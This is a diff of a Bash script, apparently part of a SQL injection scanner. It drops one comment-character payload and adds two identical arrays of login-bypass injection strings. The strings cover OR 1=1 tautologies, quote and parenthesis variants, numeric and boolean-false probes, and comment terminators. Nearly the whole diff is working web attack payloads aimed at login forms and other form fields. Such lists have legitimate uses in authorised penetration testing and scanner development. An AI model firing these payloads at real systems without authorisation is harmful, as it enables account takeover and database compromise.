@@ -16,7 +16,6 @@ declare -a payloads=(
     "'--"
     ";"
     ";--"
-    "#"
     "--"
     "-- -"
   # Standard boolean injections
@@ -56,4 +55,63 @@ declare -a payloads=(
   "1%20AND%202=1%23"
   "1%20AND%201=1/*comment*/--"
   "1%20AND%202=1/*comment*/--"
+)
+
+declare -a loginPayloads=(
+    # Basic payloads
+    "' OR '1'='1'-- -"
+    "' OR 1=1-- -"
+    "' OR 'a'='a'-- -"
+    
+    # Different quotes
+    "\" OR \"1\"=\"1\"-- -"
+    "\` OR \`1\`=\`1\`-- -"
+    
+    # Parentheses
+    "') OR '1'='1'-- -"
+    "') OR ('1'='1'-- -"
+    "')) OR (('1'='1'-- -"
+    
+    # Numeric
+    "1 OR 1=1-- -"
+    "1) OR (1=1-- -"
+    
+    # Boolean false
+    "' AND '1'='2'-- -"
+    "' OR 1=2-- -"
+    
+    # Comment variations
+    "' OR '1'='1'#"
+    "' OR 1=1#"
+    "' OR '1'='1'/*"
+)
+
+declare -a sqliFormPayloads=(
+      # Basic payloads
+    "' OR '1'='1'-- -"
+    "' OR 1=1-- -"
+    "' OR 'a'='a'-- -"
+    
+    # Different quotes
+    "\" OR \"1\"=\"1\"-- -"
+    "\` OR \`1\`=\`1\`-- -"
+    
+    # Parentheses
+    "') OR '1'='1'-- -"
+    "') OR ('1'='1'-- -"
+    "')) OR (('1'='1'-- -"
+    
+    # Numeric
+    "1 OR 1=1-- -"
+    "1) OR (1=1-- -"
+    
+    # Boolean false
+    "' AND '1'='2'-- -"
+    "' OR 1=2-- -"
+    
+    # Comment variations
+    "' OR '1'='1'#"
+    "' OR 1=1#"
+    "' OR '1'='1'/*"
+
 )
